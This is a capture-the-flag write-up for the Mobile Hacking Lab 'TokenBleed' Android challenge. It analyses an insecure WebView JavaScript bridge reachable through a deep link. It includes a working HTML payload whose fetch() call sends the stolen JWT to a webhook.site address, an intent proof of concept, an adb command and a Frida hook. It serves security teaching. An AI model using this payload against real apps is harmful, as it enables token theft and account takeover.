---
title: TokenBleed - Mobile Hacking Lab
date: 2025-4-20 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase
---

<br />

### Introduction

Welcome to the TokenBleed challenge! This lab is designed to explore a common yet critical vulnerability in Android applications: the insecure use of a WebView JavaScript Bridge. Your mission is to delve into a realistic cryptocurrency exchange application, identify how it exposes native code to a WebView, and exploit this weakness to exfiltrate a user's authentication token (JWT). This challenge provides a hands-on opportunity to understand the risks of bridging native and web code and the impact of token theft.

<br />

### Objective

Exfiltrate the authentication token used in the app **remotely** to achieve a one-click account takeover.

<br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<activity
    android:theme="@style/Theme.AppCompat.NoActionBar"
    android:name="com.mobilehackinglab.exchange.SplashActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="mhlcrypto"/>
    </intent-filter>
</activity>
<activity
    android:name="com.mobilehackinglab.exchange.LoginActivity"
    android:exported="false"/>
<activity
    android:name="com.mobilehackinglab.exchange.MainActivity"
    android:exported="false"/>
<activity
    android:name="com.mobilehackinglab.exchange.DWebViewActivity"
    android:exported="false"/>
```

<br />

From: com.mobilehackinglab.exchange.SplashActivity

```java
protected void onCreate(Bundle savedInstanceState) {
    Intent intent;
    super.onCreate(savedInstanceState);
    Context applicationContext = getApplicationContext();
    Intrinsics.checkNotNullExpressionValue(applicationContext, "getApplicationContext(...)");
    if (new TokenManager(applicationContext).getToken() != null) {
        intent = new Intent(this, (Class<?>) MainActivity.class);
        intent.setData(getIntent().getData());
        intent.setAction(getIntent().getAction());
    } else {
        intent = new Intent(this, (Class<?>) LoginActivity.class);
    }
    startActivity(intent);
    finish();
}
```



From: com.mobilehackinglab.exchange.MainActivity

```java
    private final void handleIntent(Intent intent) {
        String queryParameter;
        if (Intrinsics.areEqual(intent.getAction(), "android.intent.action.VIEW")) {
            Uri data = intent.getData();
            if (Intrinsics.areEqual(data != null ? data.getScheme() : null, "mhlcrypto")) {
                Uri data2 = intent.getData();
                Intrinsics.checkNotNull(data2);
                if (!Intrinsics.areEqual("showPage", data2.getHost()) || (queryParameter = data2.getQueryParameter("url")) == null) {
                    return;
                }
                Intent intent2 = new Intent(this, (Class<?>) DWebViewActivity.class);
                intent2.putExtra("url_to_load", queryParameter);
                startActivity(intent2);
            }
        }
    }

```

The app only allows **deep links** with the following format:

```
mhlcrypto://showPage?url=https://domain.com
```

It checks:

1. `scheme` → Must be **mhlcrypto**
2. `host` → Must be **showPage**
3. Must have `url` parameter

<br />

From: com.mobilehackinglab.exchange.DWebViewActivity

```java
String stringExtra = getIntent().getStringExtra("url_to_load");
ActivityDwebViewBinding activityDwebViewBinding2 = this.binding;
if (activityDwebViewBinding2 == null) {
    Intrinsics.throwUninitializedPropertyAccessException("binding");
    activityDwebViewBinding2 = null;
}
WebSettings settings = activityDwebViewBinding2.dwebview.getSettings();
settings.setDomStorageEnabled(true);
settings.setJavaScriptCanOpenWindowsAutomatically(false);
settings.setAllowFileAccess(false);
settings.setAllowFileAccessFromFileURLs(false);
settings.setAllowUniversalAccessFromFileURLs(false);
settings.setAllowContentAccess(false);
settings.setSupportMultipleWindows(false);
ActivityDwebViewBinding activityDwebViewBinding3 = this.binding;
if (activityDwebViewBinding3 == null) {
    Intrinsics.throwUninitializedPropertyAccessException("binding");
    activityDwebViewBinding3 = null;
}
activityDwebViewBinding3.dwebview.setWebViewClient(new WebViewClient());
ActivityDwebViewBinding activityDwebViewBinding4 = this.binding;
if (activityDwebViewBinding4 == null) {
    Intrinsics.throwUninitializedPropertyAccessException("binding");
    activityDwebViewBinding4 = null;
}
activityDwebViewBinding4.dwebview.addJavascriptObject(new JsApi(this), null);
if (stringExtra != null && StringsKt.startsWith$default(stringExtra, "http", false, 2, (Object) null)) {
    ActivityDwebViewBinding activityDwebViewBinding5 = this.binding;
    if (activityDwebViewBinding5 == null) {
        Intrinsics.throwUninitializedPropertyAccessException("binding");
    } else {
        activityDwebViewBinding = activityDwebViewBinding5;
    }
    activityDwebViewBinding.dwebview.loadUrl(stringExtra);
} else {
    finish();
}
```



<br /><br />

From: com.mobilehackinglab.exchange.JsApi

```java
@JavascriptInterface
public final void getUserAuth(Object args, CompletionHandler<Object> handler) {
    Intrinsics.checkNotNullParameter(handler, "handler");
    String token = new TokenManager(this.context).getToken();
    if (token != null) {
        handler.complete(new JSONObject(token));
    } else {
        handler.complete(new JSONObject().put("error", "No token found"));
    }
}

@JavascriptInterface
public final void openNewWindow(Object args) {
    try {
        if (args instanceof JSONObject) {
            String optString = ((JSONObject) args).optString("url");
            Intrinsics.checkNotNull(optString);
            if (optString.length() <= 0 || !StringsKt.startsWith$default(optString, "http", false, 2, (Object) null)) {
                return;
            }
            Intent intent = new Intent(this.context, (Class<?>) DWebViewActivity.class);
            intent.putExtra("url_to_load", optString);
            this.context.startActivity(intent);
        }
    } catch (Exception unused) {
    }
}

```



<br /><br />



<br />

<br />





### Using adb

to open google.com in the webview

```bash
adb shell am start -n com.mobilehackinglab.exchange/.SplashActivity -d "mhlcrypto://showPage?url=https://google.com" -a "android.intent.action.VIEW"
```

![](/assets/img/mhl/TokenBleed/2.png)







To observe incoming requests without setting up a backend, I'll use https://webhook.site. It provides a unique URL that logs all requests in real time—ideal for confirming that the JWT is actually being exfiltrated from the device.

If you examine the code closely, you’ll notice the following URLs being referenced:

- `https://mhl-cex-auth-worker.arnotstacc.workers.dev/promo/0`
- `https://mhl-cex-auth-worker.arnotstacc.workers.dev/promo/1`
- `https://mhl-cex-auth-worker.arnotstacc.workers.dev/help`

From the source code, it's clear that these endpoints are responsible for loading a specific script.

```html
<script src="https://cdn.jsdelivr.net/npm/dsbridge/dist/dsbridge.js"></script>
```





<br /><br />

to Steal the User Token:

start python web server

```
python -m http.server
```



<br />

index.html

```html
<!doctype html>
<meta charset="utf-8">

<!-- load dsbridge -->
<script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js"></script>

<script>
function sendToken(token){
  fetch("https://webhook.site/<id>?token="+encodeURIComponent(token));
}

function getToken(res) {
    if (typeof res === "string") {
        try {
            res = JSON.parse(res);
        } catch (e) {}
    }
    return res && res.data && res.data.authtoken;
}

// bridge ready and ask for token
document.addEventListener("DOMContentLoaded",()=>{
  const bridge = window.dsBridge || window._dsbridge;
  if(!bridge || !bridge.call){ 
    return;
 }

// getUserAuth
  bridge.call("getUserAuth", {}, function(resp){
      const jwt = getToken(resp);
      if(jwt){ 
        sendToken(jwt); 
    }
  });
});
</script>
```

<br />





<br />

### Android app PoC

<br />

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.mobilehackinglab.exchange", "com.mobilehackinglab.exchange.SplashActivity"));
intent.setAction("android.intent.action.VIEW");
intent.setData(Uri.parse("mhlcrypto://showPage?url=http://ip:port/index.html"));
startActivity(intent);
```



![](/assets/img/mhl/TokenBleed/1.png)

<br />





<br /><br />

**Get the Flag with Frida**

Getting the secret number is not essential for exploiting the lab, but it serves as additional practice with Frida for better understanding and hands-on experience.

Get the Secret Number With frida

```javascript
Java.perform(() => {
    let TokenManager = Java.use("com.mobilehackinglab.exchange.TokenManager");
TokenManager["getToken"].implementation = function () {
    console.log(`TokenManager.getToken is called`);
    let result = this["getToken"]();
    console.log(`TokenManager.getToken result=${result}`);
    return result;
	};
})
```

<br />

```bash
frida -U -f com.mobilehackinglab.exchange -l hook.js
```



**Flag:** MHL{w3bv1ew_br1dg3_pwned_gg}
